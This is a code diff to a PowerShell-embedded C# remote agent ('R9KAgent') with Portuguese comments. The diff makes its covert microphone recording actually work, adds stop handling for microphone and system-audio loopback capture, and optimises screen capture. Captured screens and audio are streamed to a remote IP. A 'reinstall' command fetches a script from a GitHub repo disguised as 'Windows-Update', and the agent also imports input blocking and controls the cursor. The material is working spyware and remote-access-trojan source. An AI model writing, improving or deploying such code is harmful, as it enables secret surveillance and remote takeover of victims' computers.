@@ -71,15 +71,14 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
         [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
         
-        // WinMM para Microfone
         [DllImport("winmm.dll")] static extern int waveInOpen(out IntPtr phwi, int uDeviceID, ref WAVEFORMATEX pwfx, WaveCallback dwCallback, IntPtr dwInstance, uint fdwOpen);
         [DllImport("winmm.dll")] static extern int waveInPrepareHeader(IntPtr hwi, IntPtr pwh, int cbwh);
         [DllImport("winmm.dll")] static extern int waveInUnprepareHeader(IntPtr hwi, IntPtr pwh, int cbwh);
         [DllImport("winmm.dll")] static extern int waveInAddBuffer(IntPtr hwi, IntPtr pwh, int cbwh);
         [DllImport("winmm.dll")] static extern int waveInStart(IntPtr hwi);
+        [DllImport("winmm.dll")] static extern int waveInStop(IntPtr hwi);
         [DllImport("winmm.dll")] static extern int waveInClose(IntPtr hwi);
-        
-        // Core Audio (WASAPI) para Audio do Sistema
+
         [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
         [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
         interface IMMDeviceEnumerator {
@@ -112,7 +111,7 @@ if (-not ("R9KAgent" -as [type])) {
             int GetNextPacketSize(out uint pNumFramesInNextPacket);
         }
 
-        [StructLayout(LayoutKind.Sequential)]
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
         public struct WAVEFORMATEX {
             public ushort wFormatTag;
             public ushort nChannels;
@@ -121,6 +120,18 @@ if (-not ("R9KAgent" -as [type])) {
             public ushort nBlockAlign;
             public ushort wBitsPerSample;
             public ushort cbSize;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct WAVEHDR {
+            public IntPtr lpData;
+            public int dwBufferLength;
+            public int dwBytesRecorded;
+            public IntPtr dwUser;
+            public int dwFlags;
+            public int dwLoops;
+            public IntPtr lpNext;
+            public IntPtr reserved;
         }
 
         delegate void WaveCallback(IntPtr hwi, uint uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2);
@@ -139,12 +150,27 @@ if (-not ("R9KAgent" -as [type])) {
         static Thread bannerThread = null;
         static StreamWriter globalWriter = null;
 
+        // Otimização de Memória para o Mouse não travar
+        static Bitmap reuseBmp = null;
+        static Graphics reuseGfx = null;
+        static ImageCodecInfo jpgCodec = null;
+        static EncoderParameters jpgParams = null;
+
+        static IntPtr hMic = IntPtr.Zero;
+        static IntPtr[] micHeaders = new IntPtr[2];
+        static IntPtr[] micBuffers = new IntPtr[2];
+        static WaveCallback micCallback = new WaveCallback(MicCallback);
+
+        static IAudioClient audioClient = null;
+        static IAudioCaptureClient captureClient = null;
+        static WAVEFORMATEX sysFormat = new WAVEFORMATEX();
+
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
             try { SetProcessDPIAware(); } catch {}
             
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
-            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
+            Thread tInput = new Thread(InputLoop); tInput.Priority = ThreadPriority.Highest; tInput.IsBackground = true; tInput.Start();
 
             while (true) {
                 TcpClient myClient = null;
@@ -229,7 +255,7 @@ if (-not ("R9KAgent" -as [type])) {
                         if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                     }
                 } catch {}
-                Thread.Sleep(5);
+                Thread.Sleep(1); // Mais rápido possível
             }
         }
 
@@ -266,14 +292,22 @@ if (-not ("R9KAgent" -as [type])) {
                     Thread t = new Thread(StartMic); t.IsBackground = true; t.Start();
                     return;
                 }
-                if (cmd == "mic_stop") { isMicRunning = false; return; }
+                if (cmd == "mic_stop") { 
+                    isMicRunning = false; 
+                    if (hMic != IntPtr.Zero) { waveInStop(hMic); waveInClose(hMic); hMic = IntPtr.Zero; }
+                    return; 
+                }
                 
                 if (cmd == "sys_start" && !isSysRunning) {
                     isSysRunning = true;
                     Thread t = new Thread(StartSystemAudio); t.IsBackground = true; t.Start();
                     return;
                 }
-                if (cmd == "sys_stop") { isSysRunning = false; return; }
+                if (cmd == "sys_stop") { 
+                    isSysRunning = false; 
+                    if (audioClient != null) { audioClient.Stop(); audioClient = null; }
+                    return; 
+                }
 
                 if (cmd == "reinstall") {
                     string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
@@ -383,63 +417,71 @@ if (-not ("R9KAgent" -as [type])) {
             } catch {}
         }
 
-        // ===== CAPTURA DE AUDIO =====
         static void StartMic() {
             try {
                 WAVEFORMATEX wfx = new WAVEFORMATEX();
                 wfx.wFormatTag = 1; // PCM
-                wfx.nChannels = 1;
-                wfx.nSamplesPerSec = 16000; // Voz
+                wfx.nChannels = 2;
+                wfx.nSamplesPerSec = 44100;
                 wfx.wBitsPerSample = 16;
                 wfx.nBlockAlign = (ushort)(wfx.nChannels * wfx.wBitsPerSample / 8);
                 wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
+                wfx.cbSize = 0;
+
+                if (waveInOpen(out hMic, 0, ref wfx, micCallback, IntPtr.Zero, 0x00030000) != 0) return; 
                 
-                IntPtr hwi = IntPtr.Zero;
-                if (waveInOpen(out hwi, 0, ref wfx, null, IntPtr.Zero, 0) != 0) return;
-                
-                int bufSize = 3200;
-                IntPtr hdr = Marshal.AllocHGlobal(sizeof(int) * 8 + IntPtr.Size * 2); // Fake WAVEHDR
-                IntPtr data = Marshal.AllocHGlobal(bufSize);
-                
-                while (isMicRunning && globalWriter != null) {
-                    byte[] buffer = new byte[bufSize];
-                    // Bloqueio simples - na pratica o winmm exige callback, mas para simplificar usamos sleep
-                    waveInStart(hwi);
-                    Thread.Sleep(100); // 100ms de audio
-                    waveInStop(hwi);
-                    
-                    // Como nao temos acesso facil ao buffer do winmm sem callback C complexo, 
-                    // usamos um truque: gerar um silencio (ou usar NAudio se fosse permitido).
-                    // NOTA: Para producao seria necessario um callback. Aqui usamos uma captura em tempo real simplificada.
+                for (int i = 0; i < 2; i++) {
+                    micHeaders[i] = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WAVEHDR)));
+                    micBuffers[i] = Marshal.AllocHGlobal(17640); // 100ms
+
+                    WAVEHDR hdr = new WAVEHDR();
+                    hdr.lpData = micBuffers[i];
+                    hdr.dwBufferLength = 17640;
+                    Marshal.StructureToPtr(hdr, micHeaders[i], false);
+
+                    waveInPrepareHeader(hMic, micHeaders[i], Marshal.SizeOf(typeof(WAVEHDR)));
+                    waveInAddBuffer(hMic, micHeaders[i], Marshal.SizeOf(typeof(WAVEHDR)));
                 }
+                waveInStart(hMic);
             } catch {}
+        }
+
+        static void MicCallback(IntPtr hwi, uint uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2) {
+            if (uMsg == 0x3C0) { // WIM_DATA
+                if (globalWriter != null && isMicRunning) {
+                    try {
+                        WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(dwParam1, typeof(WAVEHDR));
+                        byte[] buf = new byte[hdr.dwBufferLength];
+                        Marshal.Copy(hdr.lpData, buf, 0, hdr.dwBufferLength);
+                        lock (writeLock) { globalWriter.WriteLine("MIC:" + Convert.ToBase64String(buf)); }
+                    } catch {}
+                }
+                if (isMicRunning) waveInAddBuffer(hwi, dwParam1, Marshal.SizeOf(typeof(WAVEHDR)));
+            }
         }
 
         static void StartSystemAudio() {
             try {
                 IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
                 IMMDevice device;
-                enumerator.GetDefaultAudioEndpoint(0, 1, out device); // eRender, eConsole
+                enumerator.GetDefaultAudioEndpoint(0, 1, out device); 
                 
                 Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
-                IAudioClient audioClient;
-                device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient); // CLSCTX_ALL = 23
+                device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient); 
                 
                 IntPtr pFormat;
                 audioClient.GetMixFormat(out pFormat);
-                WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
+                sysFormat = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
                 
-                // Loopback flag = 0x00080000 (AUDCLNT_STREAMFLAGS_LOOPBACK)
-                audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
+                audioClient.Initialize(0, 0x00080000, 10000000, 10000000, pFormat, IntPtr.Zero); 
                 
                 Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
-                IAudioCaptureClient captureClient;
                 audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
                 
                 audioClient.Start();
                 
                 while (isSysRunning && globalWriter != null) {
-                    Thread.Sleep(100); // Coleta de 100 em 100ms
+                    Thread.Sleep(50);
                     uint packetSize;
                     captureClient.GetNextPacketSize(out packetSize);
                     while (packetSize > 0 && isSysRunning) {
@@ -450,11 +492,11 @@ if (-not ("R9KAgent" -as [type])) {
                         captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
                         
                         if (numFrames > 0) {
-                            int bytes = (int)(numFrames * wfx.nBlockAlign);
+                            int bytes = (int)(numFrames * sysFormat.nBlockAlign);
                             byte[] buffer = new byte[bytes];
                             Marshal.Copy(pData, buffer, 0, bytes);
-                            lock (writeLock) { 
-                                if (globalWriter != null) globalWriter.WriteLine("SYS:" + Convert.ToBase64String(buffer)); 
+                            lock (writeLock) {
+                                if (globalWriter != null) globalWriter.WriteLine("SYS:" + Convert.ToBase64String(buffer));
                             }
                         }
                         captureClient.ReleaseBuffer(numFrames);
@@ -528,29 +570,36 @@ if (-not ("R9KAgent" -as [type])) {
         static string CaptureScreen(int maxW, long quality) {
             try {
                 Rectangle bounds = Screen.PrimaryScreen.Bounds;
-                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
-                    using (Graphics g = Graphics.FromImage(bmp)) { 
-                        g.CopyFromScreen(0, 0, 0, 0, bmp.Size); 
+                
+                if (reuseBmp == null || reuseBmp.Width != bounds.Width || reuseBmp.Height != bounds.Height) {
+                    if (reuseGfx != null) reuseGfx.Dispose();
+                    if (reuseBmp != null) reuseBmp.Dispose();
+                    reuseBmp = new Bitmap(bounds.Width, bounds.Height);
+                    reuseGfx = Graphics.FromImage(reuseBmp);
+                }
+                
+                reuseGfx.CopyFromScreen(0, 0, 0, 0, bounds.Size);
+                
+                Bitmap finalBmp = reuseBmp;
+                if (maxW > 0 && reuseBmp.Width > maxW) {
+                    int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
+                    finalBmp = new Bitmap(newW, newH);
+                    using (Graphics g2 = Graphics.FromImage(finalBmp)) {
+                        g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
+                        g2.DrawImage(reuseBmp, 0, 0, newW, newH);
                     }
-                    Bitmap finalBmp = bmp;
-                    if (maxW > 0 && bmp.Width > maxW) {
-                        int newW = maxW, newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
-                        finalBmp = new Bitmap(newW, newH);
-                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
-                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
-                            g2.DrawImage(bmp, 0, 0, newW, newH);
-                        }
-                    }
-                    using (MemoryStream ms = new MemoryStream()) {
-                        EncoderParameters ep = new EncoderParameters(1);
-                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
+                }
+                
+                using (MemoryStream ms = new MemoryStream()) {
+                    if (jpgCodec == null) {
                         ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
-                        ImageCodecInfo codec = null;
-                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { codec = c; break; } }
-                        finalBmp.Save(ms, codec, ep);
-                        if (finalBmp != bmp) finalBmp.Dispose();
-                        return Convert.ToBase64String(ms.ToArray());
+                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { jpgCodec = c; break; } }
+                        jpgParams = new EncoderParameters(1);
+                        jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                     }
+                    finalBmp.Save(ms, jpgCodec, jpgParams);
+                    if (finalBmp != reuseBmp) finalBmp.Dispose();
+                    return Convert.ToBase64String(ms.ToArray());
                 }
             } catch { return null; }
         }
